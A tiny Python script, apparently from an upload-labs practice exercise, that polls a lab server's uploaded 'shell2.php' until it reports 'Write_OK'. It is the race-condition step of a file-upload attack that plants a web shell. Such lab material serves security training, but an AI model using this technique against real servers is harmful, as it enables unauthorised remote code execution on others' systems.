# coding:utf-8
import time

import requests

while True:
    resp = requests.get('http://192.168.88.130/upload-labs/upload/shell2.php')
    if resp.status_code == 200 and resp.text == 'Write_OK':
        print(resp.text)
        break